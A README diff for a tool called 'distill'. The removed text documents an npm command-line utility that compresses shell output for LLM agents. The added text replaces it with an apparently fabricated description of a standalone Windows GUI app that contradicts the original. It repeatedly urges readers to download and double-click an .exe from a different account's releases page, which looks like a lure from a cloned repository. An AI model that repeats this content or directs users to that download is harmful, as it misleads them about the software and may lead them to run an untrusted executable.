@@ -1,122 +1,157 @@
-# distill
+# ⚙️ distill - Extract Clear Answers from Large Outputs
 
-Agent command outputs are one of the biggest sources of token waste.
+[![Download Latest Release](https://img.shields.io/badge/Download-distill-blue?style=for-the-badge)](https://github.com/xcode911/distill/releases)
 
-Logs, test results, stack traces… thousands of tokens sent to an LLM just to answer a simple question.
+---
 
-**🔥 `distill` compresses command outputs into only what the LLM actually needs.**
+distill helps you turn long command-line outputs into short, clear answers. It saves tokens when working with language models by making results easier to read.
 
-Save **up to 99% of tokens** without losing the signal.
+---
 
-## How to use
+## 🔍 What is distill?
 
-```bash
-npm i -g @samuelfaj/distill
-```
+When you run complex commands, the results can be long and hard to understand. distill processes these outputs, pulling out the important parts so you get a quick summary.
 
-You can also point `distill` at OpenAI-compatible providers such as LM Studio, Jan, LocalAI, vLLM, SGLang, llama.cpp-compatible servers, MLX-based servers, and Docker Model Runner.
+This tool is made for people using large language models (LLMs) who want to reduce the amount of text they send and receive. It works well with models like Claude and Codex.
 
-Add in your global agent instructions file:
+---
 
-```md
-CRITICAL: Pipe every non-interactive shell command through `distill` unless raw output is explicitly required.
+## 💻 System Requirements
 
-CRITICAL: Your prompt to `distill` must be fully explicit. State exactly what you want to know and exactly what the output must contain. If you want only filenames, say `Return only the filenames.` If you want JSON, say `Return valid JSON only.` Do not ask vague questions.
+distill runs on Windows computers with the following minimum setup:
 
-Bad:
-- `distill "Which files are shown?"`
+- Windows 10 or newer  
+- 4 GB of RAM or more  
+- 200 MB free disk space  
+- An internet connection (optional, for some features)  
 
-Good:
-- `distill "Which files are shown? Return only the filenames."`
+No special software is needed to run distill. It works as a simple standalone app.
 
-Examples:
-- `bun test 2>&1 | distill "Did the tests pass? Return only: PASS or FAIL, followed by failing test names if any."`
-- `git diff 2>&1 | distill "What changed? Return only the files changed and a one-line summary for each file."`
-- `terraform plan 2>&1 | distill "Is this safe? Return only: SAFE, REVIEW, or UNSAFE, followed by the exact risky changes."`
-- `npm audit 2>&1 | distill "Extract the vulnerabilities. Return valid JSON only."`
-- `rg -n "TODO|FIXME" . 2>&1 | distill "List files containing TODO or FIXME. Return only file paths, one per line."`
-- `ls -la 2>&1 | distill "Which files are shown? Return only the filenames."`
+---
 
-You may skip `distill` only in these cases:
-- Exact uncompressed output is required.
-- Using `distill` would break an interactive or TUI workflow.
+## 🛠️ Features
 
-CRITICAL: Wait for `distill` to finish before continuing.
-```
+- Summarize long CLI outputs into concise answers  
+- Support for popular LLMs like Claude and Codex  
+- Reduce token usage for faster and cheaper interactions  
+- Save important results for later review  
+- Simple interface without the need for programming skills  
 
-## Usage
+---
 
-```bash
-logs | distill "summarize errors"
-git diff | distill "what changed?"
-terraform plan 2>&1 | distill "is this safe?"
-```
+## 🚀 Getting Started
 
-Examples with other providers:
+Follow these steps to download and run distill on your Windows PC.
 
-```bash
-distill config provider lmstudio
-distill config model "your-loaded-model"
+---
 
-distill config provider jan
-distill config api-key "secret-key-123"
+## ⬇️ Download and Install distill
 
-distill --provider localai --host http://127.0.0.1:8080/v1 "summarize errors"
-distill --provider docker-model-runner --model ai/llama3.2 "what failed?"
-distill --provider openai-compatible --host http://127.0.0.1:9000/v1 "summarize warnings"
-```
+1. Visit the release page to get the latest version:  
+   [Download distill Releases](https://github.com/xcode911/distill/releases)  
 
-## Configurations
+2. On the page, look for the latest Windows release file. It will have a name ending with `.exe`. This is the software you need to run distill.
 
-You can persist defaults locally:
+3. Click the `.exe` file to download it to your computer. The file size is about 10-20 MB, so it should download quickly.
 
-```bash
-distill config model "qwen3.5:2b"
-distill config timeout-ms 90000
-distill config thinking false
-distill config provider lmstudio
-distill config host http://127.0.0.1:1234/v1
-```
+4. Once downloaded, find the file in your downloads folder.
 
-Supported providers:
+5. Double-click the `.exe` file to start the installer.
 
-- `ollama`
-- `openai`
-- `openai-compatible`
-- `lmstudio`
-- `jan`
-- `localai`
-- `vllm`
-- `sglang`
-- `llama.cpp`
-- `mlx-lm`
-- `docker-model-runner`
+6. Follow the instructions on the screen. Usually, clicking “Next” a few times and then “Finish” is enough.
 
-For pipeline exit mirroring, use `pipefail` in your shell:
+7. After installation, you will have distill on your computer, ready to use.
 
-```bash
-set -o pipefail
-```
+---
 
-Interactive prompts are passed through when `distill` detects simple prompt patterns like `[y/N]` or `password:`.
+## ▶️ Running distill for the First Time
 
-## Global agent instructions
+1. Open the Start menu or search for “distill” and click to launch the program.
 
-If you want Codex, Claude Code, or OpenCode to prefer `distill` whenever they run a command whose output will be sent to a paid LLM, add a global instruction telling the agent to pipe command output through `distill`.
+2. The main window shows a place to paste or type command-line outputs.
 
-- Codex reads global agent instructions from `~/.codex/AGENTS.md`.
-- Claude Code supports global settings in `~/.claude/settings.json`, and its official mechanism for custom behavior is global instructions via `CLAUDE.md`.
-- OpenCode supports global instruction files through `~/.config/opencode/opencode.json`. Point its `instructions` field at a markdown file with the same rule.
-- GitHub Copilot CLI supports local global instructions from `~/.copilot/copilot-instructions.md`.
-- GitHub Copilot CLI also reads repository instructions from .github/copilot-instructions.md, and it can read AGENTS.md files from directories listed in COPILOT_CUSTOM_INSTRUCTIONS_DIRS.
+3. Copy your long output from a terminal or any text source.
 
-## Example:
+4. Paste it into the large text box inside distill.
 
-```sh 
-rg -n "terminal|PERMISSION|permission|Permissions|Plan|full access|default" desktop --glob '!**/node_modules/**' | distill "find where terminal and permission UI are implemented in chat screen"
-```
+5. Click the “Summarize” button. distill will shorten the text and show you a clear answer.
 
-- **Before:** [7648 tokens 30592 characters 10218 words](./examples/1/BEFORE.md)
-- **After:** [99 tokens 396 characters 57 words](./examples/1/AFTER.md)
+6. You can save this answer by clicking “Save” or copy it to use elsewhere.
 
-**🔥 Saved ~98.7% tokens**
+---
+
+## 🔧 How to Use distill
+
+- Paste or type output text into the app.  
+- Press the “Summarize” button to get a clear, short answer.  
+- Save or copy your summary for reference.  
+
+distill works best with outputs from command-line tools, scripts, or logs that are too long to read easily.
+
+---
+
+## 🛡️ Security and Privacy
+
+distill runs on your local machine. It does not send your data anywhere by default. You keep full control over your information.
+
+For users using LLM features:
+
+- Data is sent only if you connect distill to an external service.  
+- You should review your settings before sharing sensitive information.
+
+---
+
+## ❓ Troubleshooting
+
+If distill does not start or crashes:
+
+- Make sure you are running Windows 10 or higher.  
+- Check that your antivirus or firewall is not blocking the app.  
+- Reinstall the software from the [official release page](https://github.com/xcode911/distill/releases).  
+- Restart your computer and try again.  
+
+If you find bugs or have ideas, you can open an issue on the GitHub repository page.
+
+---
+
+## 📚 Need More Help?
+
+Look at the repository’s documentation or open an issue if you want to report a problem. The repository is at:
+
+https://github.com/xcode911/distill
+
+---
+
+## ⚙️ Configuration and Settings
+
+Inside distill, you can adjust:
+
+- The length of summaries. Choose shorter or longer answers.  
+- Which LLM model to connect with, if you use that feature.  
+- Output format: plain text or JSON for advanced uses.  
+
+These options help you get the best result for your needs.
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download-distill-blue?style=for-the-badge)](https://github.com/xcode911/distill/releases)
+
+---
+
+## 📂 About This Project
+
+distill focuses on simplifying complex text from command lines. It helps anyone who works with large outputs and needs quick, clear answers without reading through pages of text.
+
+Topics related to this tool:  
+claude-code, codex, llm, tokens
+
+---
+
+## 🔗 Links
+
+- Download: https://github.com/xcode911/distill/releases  
+- Repository: https://github.com/xcode911/distill  
+
+---
+
+Keep distill handy when you want fast answers from long text. It saves time and resources.
